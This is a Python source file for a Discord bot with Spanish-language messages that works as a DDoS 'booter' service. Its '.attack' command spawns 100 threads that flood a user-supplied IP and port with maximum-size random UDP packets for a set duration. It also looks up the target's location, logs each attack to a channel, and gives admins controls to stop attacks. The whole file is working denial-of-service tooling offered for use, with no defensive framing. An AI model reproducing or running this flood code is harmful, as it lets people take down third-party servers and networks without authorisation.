import discord
from discord.ext import commands
import socket
import asyncio
import aiohttp
import threading
import random
import datetime

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

ADMIN_ID = 1367535670410875070  # Reemplaza con tu ID
CHANNEL_LOG_ID = 1370806198340681758  # ID del canal de logs

current_attack = None
attack_id_counter = 1
active_attacks = {}

METHODS = ['UDPGAME', 'UDPGOOD', 'UDPRAW', 'DNS']
BYTES = 65507
THREADS = 100

@bot.event
async def on_ready():
    print(f"Bot listo como: {bot.user}")

@bot.command()
async def dhelp(ctx):
    help_text = (
        "**Comandos:**\n"
        "`.dhelp` - Ver comandos\n"
        "`.info` - Ver info\n"
        "`.methods` - Ver métodos disponibles\n"
        "`.ping <ip>` - Hacer ping a una IP\n"
        "`.hostip <dominio>` - Obtener IP\n"
        "`.ipinfo <ip>` - Ver info IP\n"
        "`.attack <ip> <port> <method> <time>` - Iniciar ataque\n"
        "`.stop <id>` - Detener ataque (admin)\n"
        "`.stopall` - Detener todos (admin)\n"
        "`.api` - Estado API"
    )
    await ctx.send(help_text)

@bot.command()
async def info(ctx):
    await ctx.send("Bot en ejecución.")

@bot.command()
async def methods(ctx):
    await ctx.send("Métodos disponibles: UDPGOOD | UDPRAW | UDPGAME | DNS")

@bot.command()
async def hostip(ctx, domain: str):
    try:
        ip = socket.gethostbyname(domain)
        await ctx.send(f"La IP de `{domain}` es `{ip}`")
    except Exception as e:
        await ctx.send(f"Error al resolver dominio: {e}")

@bot.command()
async def ipinfo(ctx, ip: str):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"http://ip-api.com/json/{ip}") as resp:
            if resp.status == 200:
                data = await resp.json()
                info = (
                    f"**IP:** {data.get('query')}\n"
                    f"Ciudad: {data.get('city')}\n"
                    f"Región: {data.get('regionName')}\n"
                    f"País: {data.get('country')}\n"
                    f"ISP: {data.get('isp')}\n"
                    f"Ubicación: {data.get('lat')}, {data.get('lon')}"
                )
                await ctx.send(info)
            else:
                await ctx.send("No se pudo obtener la información de la IP.")

@bot.command()
async def ping(ctx, ip: str):
    try:
        output = await asyncio.create_subprocess_exec(
            'ping', '-c', '1', ip,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await output.communicate()
        if stdout:
            await ctx.send(f"```{stdout.decode()}```")
        else:
            await ctx.send(f"Error: {stderr.decode()}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def api(ctx):
    await ctx.send("API nodo1: ONLINE")

# Función de ataque mejorada para hacer un tráfico más fuerte
def advanced_udp_flood(ip, port, stop_event):
    try:
        while not stop_event.is_set():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            for _ in range(10):  # Enviar 10 paquetes por iteración por hilo
                payload = random._urandom(BYTES)
                try:
                    sock.sendto(payload, (ip, port))
                except:
                    pass
            sock.close()
    except Exception as e:
        print(f"Error en hilo: {e}")

@bot.command()
async def attack(ctx, ip: str, port: int, method: str, duration: int):
    global current_attack, attack_id_counter

    method = method.upper()
    if method not in METHODS:
        return await ctx.send("Método no válido. Usa `.methods`")

    if duration > 60 and ctx.author.id != ADMIN_ID:
        return await ctx.send("Máximo permitido: 60 segundos.")

    if current_attack and ctx.author.id != ADMIN_ID:
        return await ctx.send("Ya hay un ataque activo.")

    async with aiohttp.ClientSession() as session:
        async with session.get(f"http://ip-api.com/json/{ip}") as resp:
            if resp.status == 200:
                data = await resp.json()
                location = f"{data.get('country', '?')}, {data.get('regionName', '?')}, {data.get('city', '?')}"
            else:
                location = "Desconocida"

    attack_id = attack_id_counter
    attack_id_counter += 1
    stop_event = threading.Event()
    current_attack = {
        "user": ctx.author.id,
        "ip": ip,
        "port": port,
        "method": method,
        "id": attack_id,
        "stop": stop_event
    }

    await ctx.send(f"Ataque `{attack_id}` iniciado contra `{ip}:{port}` usando `{method}` por `{duration}`s")

    log_channel = bot.get_channel(CHANNEL_LOG_ID)
    if log_channel:
        embed = discord.Embed(title="Nuevo ataque", color=discord.Color.red())
        embed.add_field(name="Usuario", value=f"{ctx.author} ({ctx.author.id})", inline=False)
        embed.add_field(name="IP", value=ip)
        embed.add_field(name="Puerto", value=port)
        embed.add_field(name="Método", value=method)
        embed.add_field(name="Duración", value=f"{duration}s")
        embed.add_field(name="Ubicación", value=location)
        embed.add_field(name="ID", value=attack_id)
        embed.timestamp = datetime.datetime.utcnow()
        await log_channel.send(embed=embed)

    def run_attack():
        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=advanced_udp_flood, args=(ip, port, stop_event))
            t.start()
            threads.append(t)
        stop_event.wait(duration)
        stop_event.set()
        for t in threads:
            t.join()
        asyncio.run_coroutine_threadsafe(ctx.send(f"Ataque `{attack_id}` finalizado."), bot.loop)

    thread = threading.Thread(target=run_attack)
    thread.start()
    active_attacks[attack_id] = stop_event

@bot.command()
async def stop(ctx, attack_id: int):
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("No tienes permiso.")

    stop_event = active_attacks.get(attack_id)
    if stop_event:
        stop_event.set()
        await ctx.send(f"Ataque `{attack_id}` detenido.")
        if current_attack and current_attack["id"] == attack_id:
            current_attack.clear()
        del active_attacks[attack_id]
    else:
        await ctx.send("ID no válido o ataque ya detenido.")

@bot.command()
async def stopall(ctx):
    if ctx.author.id != ADMIN_ID:
        return await ctx.send("No tienes permiso.")
    for aid, stop_event in list(active_attacks.items()):
        stop_event.set()
        await ctx.send(f"Ataque `{aid}` detenido.")
    active_attacks.clear()
    current_attack.clear()

# Reemplaza 'TU_TOKEN_AQUI' con el token real
bot.run("TU_TOKEN_AQUI")
